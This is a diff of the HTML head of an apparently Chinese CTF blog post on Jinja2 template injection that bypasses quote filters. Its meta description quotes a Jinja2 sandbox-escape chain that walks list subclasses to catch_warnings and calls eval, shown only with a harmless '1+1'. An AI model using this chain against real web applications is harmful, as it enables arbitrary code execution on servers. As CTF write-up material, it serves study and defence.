@@ -15,19 +15,6 @@
 <meta name="author" content="littlezz" />
 <meta name="description" content="intro 不久前 plaidctf 中有一题模板注入， 但是引号会被过滤掉， 挣扎了很久， 非常痛苦， 到最后要用 eval 任意代码执行的时候想到不能有引号没有办法构造字符串， 岂不是依然 GG。（当然最后是用其他的方法 后来想了一下绕过引号的方法。 首先模板注入的原理是在 jinja2 中可以访问对象的属性，同时列表是存在的， 这样可以通过访问列表的属性一层层的找到其他类或者是__buildtins__, 然后找出 eval进行任意代码执行， 绕过沙盒的限制 #! python3 from jinja2 import Template Template(&#39;{}&#39;.format(&#39;{{[].__class__}}&#39;)).render() #output &#34;&lt;class &#39;list&#39;&gt;&#34; 我们可以通过这种方法调用自带的函数或者对象， 通过subclasses 找到更加多的类 [].__class__.__base__.__subclasses__() print([].__class__.__base__.__subclasses__()[0]) #output type 之后利用其中的 catch_warnings 访问 globals 定位出 eval， 然后进行任意代码执行。 #python3 In [146]: [].__class__.__base__.__subclasses__()[166] Out[146]: warnings.catch_warnings In [153]: Template(&#39;{{[].__class__.__base__.__subclasses__()[166].__init__.__g ...: lobals__.__builtins__.eval(&#34;1+1&#34;)}}&#39;).render() Out[153]: &#39;2&#39; 绕过引号 一般情况下， %会被过滤， 但是如果引号也被过滤的话怎么构造出 …" />
 <meta name="keywords" content="python, 小结">
-<!--<meta property="og:site_name" content="littlezz's Blog"/>
-<meta property="og:title" content="jinja2 模板注入绕过引号任意代码执行"/>
-<meta property="og:description" content="intro 不久前 plaidctf 中有一题模板注入， 但是引号会被过滤掉， 挣扎了很久， 非常痛苦， 到最后要用 eval 任意代码执行的时候想到不能有引号没有办法构造字符串， 岂不是依然 GG。（当然最后是用其他的方法 后来想了一下绕过引号的方法。 首先模板注入的原理是在 jinja2 中可以访问对象的属性，同时列表是存在的， 这样可以通过访问列表的属性一层层的找到其他类或者是__buildtins__, 然后找出 eval进行任意代码执行， 绕过沙盒的限制 #! python3 from jinja2 import Template Template('{}'.format('{{[].__class__}}')).render() #output "<class 'list'>" 我们可以通过这种方法调用自带的函数或者对象， 通过subclasses 找到更加多的类 [].__class__.__base__.__subclasses__() print([].__class__.__base__.__subclasses__()[0]) #output type 之后利用其中的 catch_warnings 访问 globals 定位出 eval， 然后进行任意代码执行。 #python3 In [146]: [].__class__.__base__.__subclasses__()[166] Out[146]: warnings.catch_warnings In [153]: Template('{{[].__class__.__base__.__subclasses__()[166].__init__.__g ...: lobals__.__builtins__.eval("1+1")}}').render() Out[153]: '2' 绕过引号 一般情况下， %会被过滤， 但是如果引号也被过滤的话怎么构造出 …"/>
-<meta property="og:locale" content="en_US"/>
-<meta property="og:url" content="http://littlezz.github.io/jinja2-mo-ban-zhu-ru-rao-guo-yin-hao-ren-yi-dai-ma-zhi-xing.html"/>
-<meta property="og:type" content="article"/>
-<meta property="article:published_time" content="2017-05-01 00:00:00+08:00"/>
-<meta property="article:modified_time" content=""/>
-<meta property="article:author" content="http://littlezz.github.io/author/littlezz.html">
-<meta property="article:section" content="Python"/>
-<meta property="article:tag" content="python"/>
-<meta property="article:tag" content="小结"/>
-<meta property="og:image" content="/images/logo.jpg">-->
   <title>littlezz's Blog &ndash; jinja2 模板注入绕过引号任意代码执行</title>
 </head>
 <body>
